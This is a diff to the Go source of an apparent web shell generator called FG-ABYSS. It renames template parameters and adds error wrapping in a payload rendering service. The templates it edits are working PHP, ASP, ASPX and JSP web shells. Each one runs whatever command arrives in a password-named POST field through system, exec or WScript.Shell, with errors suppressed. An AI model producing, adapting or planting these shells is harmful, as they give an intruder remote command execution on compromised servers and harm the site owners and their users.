@@ -2,6 +2,7 @@ package services
 
 import (
 	"fg-abyss/internal/domain/entity"
+	"fmt"
 	"strings"
 	"text/template"
 )
@@ -152,12 +153,17 @@ func (s *PayloadTemplateService) RenderTemplate(tmplName string, config *entity.
 		return "", err
 	}
 	
-	// 创建模板参数
+	// 创建模板参数 - 使用更清晰的参数名
 	data := map[string]interface{}{
+		"Password":        config.Password,
 		"password":        config.Password,
+		"Encoder":         config.Encoder,
 		"encoder":         config.Encoder,
+		"EncryptionKey":   config.EncryptionKey,
 		"encryptionKey":   config.EncryptionKey,
+		"Obfuscation":     config.ObfuscationLevel,
 		"obfuscation":     config.ObfuscationLevel,
+		"Function":        config.Function,
 		"function":        config.Function,
 	}
 	
@@ -169,13 +175,13 @@ func (s *PayloadTemplateService) RenderTemplate(tmplName string, config *entity.
 	// 渲染模板
 	t, err := template.New("payload").Parse(tmpl.Content)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("parse template failed: %w", err)
 	}
 	
 	var builder strings.Builder
 	err = t.Execute(&builder, data)
 	if err != nil {
-		return "", err
+		return "", fmt.Errorf("execute template failed: %w", err)
 	}
 	
 	return builder.String(), nil
@@ -185,13 +191,13 @@ func (s *PayloadTemplateService) RenderTemplate(tmplName string, config *entity.
 
 const phpBasicTemplate = `<?php
 // FG-ABYSS PHP Basic Payload
-// Password: {{.password}}
+// Password: {{.Password}}
 
 error_reporting(0);
 set_time_limit(0);
 
-if (isset($_POST['{{.password}}'])) {
-    $command = $_POST['{{.password}}'];
+if (isset($_POST['{{.Password}}'])) {
+    $command = $_POST['{{.Password}}'];
     if (function_exists('system')) {
         @system($command);
     } elseif (function_exists('exec')) {
@@ -207,7 +213,7 @@ if (isset($_POST['{{.password}}'])) {
 
 const phpFullTemplate = `<?php
 // FG-ABYSS PHP Full Payload
-// Password: {{.password}}
+// Password: {{.Password}}
 // Features: Command, File, Database, System Info
 
 error_reporting(0);
@@ -215,7 +221,7 @@ set_time_limit(0);
 ini_set('max_execution_time', 0);
 
 class Shell {
-    private $password = '{{.password}}';
+    private $password = '{{.Password}}';
     
     public function __construct() {
         if (isset($_POST[$this->password])) {
@@ -351,11 +357,11 @@ new Shell();
 
 const aspBasicTemplate = `<%
 ' FG-ABYSS ASP Basic Payload
-' Password: {{.password}}
+' Password: {{.Password}}
 
 On Error Resume Next
 Dim cmd, shell
-cmd = Request.Form("{{.password}}")
+cmd = Request.Form("{{.Password}}")
 
 If cmd <> "" Then
     Set shell = Server.CreateObject("WScript.Shell")
@@ -376,9 +382,9 @@ const aspxBasicTemplate = `<%@ Page Language="C#" %>
 
 <%
 // FG-ABYSS ASPX Basic Payload
-// Password: {{.password}}
+// Password: {{.Password}}
 
-string password = "{{.password}}";
+string password = "{{.Password}}";
 string cmd = Request.Form[password];
 
 if (!string.IsNullOrEmpty(cmd))
@@ -406,9 +412,9 @@ if (!string.IsNullOrEmpty(cmd))
 const jspBasicTemplate = `<%@ page import="java.io.*" %>
 <%
 // FG-ABYSS JSP Basic Payload
-// Password: {{.password}}
+// Password: {{.Password}}
 
-String password = "{{.password}}";
+String password = "{{.Password}}";
 String cmd = request.getParameter(password);
 
 if (cmd != null && !cmd.isEmpty()) {
